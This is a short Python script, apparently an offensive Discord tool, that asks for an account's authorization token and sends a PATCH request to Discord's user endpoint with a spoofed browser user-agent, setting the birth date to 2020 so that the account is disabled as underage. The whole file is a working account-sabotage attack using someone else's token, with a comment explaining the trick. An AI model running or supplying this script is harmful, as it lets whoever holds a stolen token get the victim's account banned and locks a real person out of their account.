import requests
import json
from colorama import init, Fore, Back, Style
import os

def ban_token():
    if os.name == 'nt':
      os.system('cls')
    else:
      os.system('clear')
    init()
    print(Style.BRIGHT)
    print(Back.BLACK)
    print(f"{Fore.RED}token to disable: ", end='')
    Token = input()
    headers = {"authorization": Token, "user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"}
    for i in range(0, 1):
        print(f"{Fore.GREEN}attempting to disable the account...")
        requests.patch(
            "https://discordapp.com/api/v9/users/@me",
            headers=headers,
            json={"date_of_birth": "2020-2-11"},
        ) # if you're curious, this works by setting the account to an age it cant. this effectively disables the acc; because you cant be under thirteen and use discord.
